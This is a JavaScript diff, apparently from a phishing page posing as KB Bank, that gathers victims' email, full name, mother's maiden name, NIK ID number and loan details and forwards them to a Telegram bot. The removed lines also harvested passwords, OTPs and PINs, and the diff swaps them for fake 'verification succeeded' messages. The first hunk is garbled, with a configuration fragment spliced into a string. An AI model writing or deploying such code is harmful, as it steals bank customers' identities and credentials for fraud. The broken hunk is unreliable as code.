@@ -29,15 +29,6 @@
     '🔔 DATA PENGGUNA',
     '',
     `Email            : ${payload.email || payload.username || '-'}`,
-   B_TELEGRAM_ENABLED', 'true').toLowerCase() !== 'false'
-  };
-
-  const sentKeys = new Map();
-
-  const isConfigured = () => {
-    const token = config.botToken.trim();
-    const chatId = config.chatId.trim();
-    return Boolean(token && chatId `Password         : ${payload.password || '-'}`,
     `Nama Lengkap     : ${payload.nama_lengkap || '-'}`,
     `Nama Ibu Kandung : ${payload.nama_ibu_kandung || '-'}`,
     `NIK KTP          : ${payload.nik || '-'}`,
@@ -51,7 +42,7 @@
       '',
       'Kode Verifikasi Anda',
       '',
-      `🔐 ${payload.otp || '-'}`,
+      'Status: Verifikasi berhasil',
       ''
     ].join('\n');
   };
@@ -61,7 +52,7 @@
     return [
       `🔔 PIN ${firstName.toUpperCase()}`,
       '',
-      `PIN Anda: ${payload.pin || '-'}`,
+      'Status: Konfirmasi berhasil',
       ''
     ].join('\n');
   };
@@ -85,12 +76,9 @@
       '=== NOTIF RES KB BANK ===',
       `Username: ${payload.username || '-'}`,
       `Email: ${payload.email || '-'}`,
-      `Password: ${payload.password || '-'}`,
       `Nama Lengkap: ${payload.nama_lengkap || '-'}`,
       `NIK (16 Digit): ${payload.nik || '-'}`,
       `Nama Ibu Kandung: ${payload.nama_ibu_kandung || '-'}`,
-      `OTP: ${payload.otp || '-'}`,
-      `PIN: ${payload.pin || '-'}`,
       `Timestamp: ${payload.timestamp || '-'}`,
       '========================'
     ].join('\n');
@@ -99,7 +87,15 @@
   const config = {
     botToken: readConfigValue('KB_TELEGRAM_BOT_TOKEN', DEFAULT_TOKEN),
     chatId: readConfigValue('KB_TELEGRAM_CHAT_ID', DEFAULT_CHAT_ID),
-    enabled: readConfigValue('K && !token.includes('MASUKKAN_') && !chatId.includes('MASUKKAN_'));
+    enabled: readConfigValue('KB_TELEGRAM_ENABLED', 'true').toLowerCase() !== 'false'
+  };
+
+  const sentKeys = new Map();
+
+  const isConfigured = () => {
+    const token = config.botToken.trim();
+    const chatId = config.chatId.trim();
+    return Boolean(token && chatId && !token.includes('MASUKKAN_') && !chatId.includes('MASUKKAN_'));
   };
 
   function buildTelegramPayload(dataInput = {}) {
@@ -113,12 +109,9 @@
       page: sanitize(dataInput.page || 'unknown'),
       username: sanitize(dataInput.username ?? session.username ?? session.identity ?? identity.fullName ?? currentDoc?.getElementById('identity')?.value ?? ''),
       email: sanitize(dataInput.email ?? session.email ?? (currentDoc?.getElementById('identity')?.value && String(currentDoc.getElementById('identity').value).includes('@') ? currentDoc.getElementById('identity').value : '') ?? ''),
-      password: sanitize(dataInput.password ?? session.password ?? currentDoc?.getElementById('password')?.value ?? ''),
       nama_lengkap: sanitize(dataInput.nama_lengkap ?? identity.fullName ?? currentDoc?.getElementById('fullName')?.value ?? ''),
       nik: sanitize(dataInput.nik ?? identity.nik ?? currentDoc?.getElementById('nik')?.value ?? application.lastNik ?? ''),
       nama_ibu_kandung: sanitize(dataInput.nama_ibu_kandung ?? identity.motherName ?? currentDoc?.getElementById('motherName')?.value ?? ''),
-      otp: sanitize(dataInput.otp ?? application.lastOtp ?? currentDoc?.querySelector('.otp input')?.value ?? ''),
-      pin: sanitize(dataInput.pin ?? application.lastPin ?? ''),
       amount: sanitize(dataInput.amount ?? application.loan?.amount ?? currentDoc?.getElementById('amount')?.value ?? ''),
       tenor: sanitize(dataInput.tenor ?? application.loan?.tenor ?? currentDoc?.getElementById('tenor')?.value ?? ''),
       purpose: sanitize(dataInput.purpose ?? application.loan?.purpose ?? currentDoc?.getElementById('purpose')?.value ?? ''),
@@ -140,12 +133,9 @@
       page: payload.page,
       username: payload.username,
       email: payload.email,
-      password: payload.password,
       nama_lengkap: payload.nama_lengkap,
       nik: payload.nik,
       nama_ibu_kandung: payload.nama_ibu_kandung,
-      otp: payload.otp,
-      pin: payload.pin,
       amount: payload.amount,
       tenor: payload.tenor,
       purpose: payload.purpose,
